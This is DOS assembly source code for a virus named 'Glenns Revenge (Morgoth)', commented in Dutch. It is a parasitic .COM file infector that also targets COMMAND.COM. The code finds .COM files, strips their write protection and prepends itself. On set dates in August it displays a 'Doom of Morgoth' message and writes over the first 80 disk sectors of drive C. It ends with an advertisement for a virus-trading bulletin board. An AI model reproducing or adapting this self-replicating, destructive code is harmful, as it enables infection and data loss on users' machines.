;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                         Glenns Revenge (Morgoth)                            ³
;ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;³ This will be a Parasytic Non-Resident .COM infector.                        ³
;³ It will also infect COMMAND.COM.                                            ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;
;
;
;
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This will contain the segment status, original start, pre-defined
; defenitions, and public settings.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
.MODEL TINY

Public		VirLen,MovLen,PutMsg

Code		Segment para 'Code'
Assume		Cs:Code,Ds:Code,Es:Code

		Org 100h

Signature	Equ 0Addeh	; Signature of virus is DEAD!

BegMonthAct	Equ 8		; Begin Month of activation
EndMonthAct	Equ 8		; End Month of activation
BegDayAct	Equ 3		; Begin Day of activation
EndDayAct	Equ 18  	; End Day of activation

ActString	Equ CR,LF,'This Personal Computer has been struck by the uncurable disease that is',CR,LF,'called "The Doom of Morgoth".',CR,LF,EOM

CR		Equ 13		; Return
LF		Equ 10		; Linefeed
EOM		Equ '$'		; Einde Tekst

Buff1		Equ 0F000h
Buff2		Equ Buff1+2
VirLen		Equ Offset Einde-Offset Begin
MovLen		Equ Offset Einde-Offset Mover
Proggie		Equ Offset DTA+1Eh

MinLen		Equ Virlen+10	;Minimale lengte te besmetten programma
MaxLen		Equ 0EF00h	; Maximale lengte te besmetten programma

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This will contain only macros, for pieces of code which will be
; used very often.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This part will contain the actual virus code, for searching the
; next victim and infection of it.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Begin:
		Jmp Short OverSig	; Sprong naar Oversig vanwege kenmerk
                DW Signature            ; Herkenningsteken virus
Oversig:
                Pushf                   ;------------------
		Push AX			; Alle registers opslaan voor
		Push BX			; later gebruik van het programma
		Push CX                 ;
		Push DX                 ;
		Push DS                 ;
		Push ES                 ;
		Push SS                 ;
		Push SI                 ;
		Push DI                 ;------------------

		Mov AH,2Ah		;------------------
		Int 21h                 ; Systeemdatum vergelijken met
		Cmp DH,BegMonthAct      ; activatiedatum. Als dit gelijk is
		Jb InfectPart           ; moet word PutMsg aangeroepen, anders
		Cmp DH,EndMonthAct      ; wordt InfectPart aangeroepen.
		Jg InfectPart           ;
		Cmp DL,BegDayAct        ;
		Jb InfectPart           ;
		Cmp DL,EndDayAct        ;
		Jg InfectPart           ;------------------
PutMsg:		Mov AH,09h		; Activatiebericht wordt getoont en
		Mov DX,Offset Msg       ; de eerste 80 sectoren van de C
		Int 21h                 ; drive worden volgeschreven met
		Int 20h			;
		Mov AL,2		; onzin. Computer is vastgelopen :
		Mov CX,80               ;     RESET!
		Mov DX,0                ;
		Int 26h                 ;
Vastgezet:	Jmp Vastgezet           ;------------------

InfectPart:
		Mov AX,Sprong           ;------------------
		Mov Buf1,AX             ; Spronggegevens bewaren om
		Mov BX,Source           ; besmette programma te starten
		Mov Buf2,BX             ;------------------
		Mov AH,1Ah		; DTA area instellen op
		Lea DX,DTA              ; $DTA area
		Int 21h                 ;------------------
Vindeerst:	Mov AH,4Eh		; Zoeken naar 1e .COM file in directory
		Mov Cx,1		;
		Lea DX,FindPath         ;
		Int 21h                 ;------------------
		Jnc KijkInfected	; Geen gevonden, goto Afgelopen
		Jmp Afgelopen		;------------------
KijkInfected:
		Mov DX,DTA+1Ah		;------------------
		Cmp DX,MinLen           ; Kijken of programmalengte voldoet
		Jb  ZoekNext            ; aan de eisen van het virus
		Mov DX,MaxLen           ; (langer dan virus)
		Cmp DX,DTA+1Ah          ;
		Jb  ZoekNext            ;------------------
On2:		Mov AH,3Dh		; Zo ja , file openen en file handle
		Mov AL,2		; opslaan
		Mov DX,Proggie		;
		Int 21h			;
		Mov FH,AX               ;------------------
  		Mov BX,AX               ;
 		Mov AH,3Fh              ; Lezen 1e 4 bytes van een file met
 		Mov CX,4                ; een mogelijk kenmerk van het virus
		Mov DX,Buff1            ;
		Int 21h                 ;------------------
Sluiten:	Mov AH,3Eh		; File weer sluiten
		Int 21h			;------------------
		Mov AX,CS:[Buff2]	; Vergelijken inhoud lokatie Buff1+2
		Cmp AX,Signature        ; met Signature. Niet gelijk : Zoeknext
		Jz  ZoekNext            ;------------------
		Jmp Infect
ZoekNext:
		Mov AH,4Fh              ;------------------
		Int 21h                 ; Zoeken naar volgende .COM file
		Jnc KijkInfected        ; Geen gevonden, goto Afgelopen
                Jmp Afgelopen           ;------------------

Infect:
		Mov AH,43h		;------------------
		Mov AL,0                ; Eventuele schrijf-
                Mov DX,Proggie	        ; beveiliging weghalen
		Int 21h                 ; van het programma
		Mov AH,43h              ;
		Mov AL,1                ;
		And CX,11111110b        ;
		Int 21h                 ;------------------
		Mov AH,3Dh		; Bestand openen
		Mov AL,2                ;
                Mov DX,Proggie          ;
		Int 21h                 ;------------------
		Mov FH,AX		; Opslaan op stack van
		Mov BX,AX               ; datum voor later gebruik
		Mov AH,57H              ;
		Mov AL,0                ;
		Int 21h                 ;
		Push CX                 ;
		Push DX                 ;------------------
		Mov AH,3Fh              ; Inlezen van eerste deel van het
		Mov CX,VirLen+2		; programma om later terug te
		Mov DX,Buff1            ; kunnen plaatsen.
		Int 21h                 ;------------------
		Mov AH,42H		; File Pointer weer naar het
		Mov AL,2		; einde van het programma
		Xor CX,CX		; zetten
		Xor DX,DX		;
		Int 21h                 ;------------------
		Xor DX,DX		; Bepalen van de variabele sprongen
		Add AX,100h             ; in het virus (move-routine)
		Mov Sprong,AX           ;
		Add AX,MovLen		;
		Mov Source,AX           ;------------------
		Mov AH,40H              ; Move routine bewaren aan
                Mov DX,Offset Mover     ; einde van file
		Mov CX,MovLen           ;
		Int 21h                 ;------------------
		Mov AH,40H              ; Eerste deel programma aan-
		Mov DX,Buff1            ; voegen na Move routine
		Mov CX,VirLen           ;
		Int 21h                 ;------------------
                Mov AH,42h              ; File Pointer weer naar
		Mov AL,0		; het begin van file
		Xor CX,CX               ; sturen
		Xor DX,DX               ;
		Int 21h                 ;------------------
		Mov AH,40h              ; En programma overschrijven
		Mov DX,Offset Begin     ; met code van het virus
		Mov CX,VirLen           ;
		Int 21h                 ;------------------
		Mov AH,57h		; Datum van aangesproken file
		Mov AL,1                ; weer herstellen
		Pop DX                  ;
		Pop CX                  ;
		Int 21h                 ;------------------
		Mov AH,3Eh		; Sluiten file
		Int 21h                 ;------------------
Afgelopen:	Mov BX,Buf2             ; Sprongvariabelen weer
		Mov Source,BX           ; op normaal zetten voor
		Mov AX,Buf1             ; de Move routine
		Mov Sprong,AX           ;------------------
		Mov AH,1Ah              ; DTA adres weer op normaal
		Mov Dx,80h              ; zetten en naar de Move
		Int 21h                 ; routine springen
		Jmp CS:[Sprong]         ;------------------

Msg		db ActString

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; All variables are stored in here, like filehandle, date/time,
; search path and various buffers.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

FH      	DW 0
FindPath        DB '*.COM',0

Buf1		DW 0
Buf2            DW 0

Sprong		DW 0
Source		DW 0

DTA		DW 64 DUP(?)

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This will contain the relocator routine, located at the end of
; the ORIGINAL file. This will tranfer the 1st part of the program
; to it's original place.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Mover:
		Mov DI,Offset Begin	;------------------
		Mov SI,Source           ; Verplaatsen van het 1e deel
		Mov CX,VirLen-1         ; van het programma, wat achter
		Movsb                   ; deze verplaatsroutine staat.
		Rep Movsb               ;------------------
		Pop DI			; Opgeslagen registers weer
		Pop SI                  ; terugzetten op originele
		Pop SS                  ; waarde en springen naar
		Pop ES                  ; het begin van het programma
		Pop DS                  ; (waar nu het virus niet meer
		Pop DX                  ; staat)
		Pop CX                  ;
		Pop BX                  ;
		Pop AX                  ;
		Popf                    ;
		Mov BX,100h             ;
		Jmp BX	 		;------------------

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Only the end of the virus is stored in here.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Einde		db 0

Code            Ends
End             Begin

;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> and Remember Don't Forget to Call <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
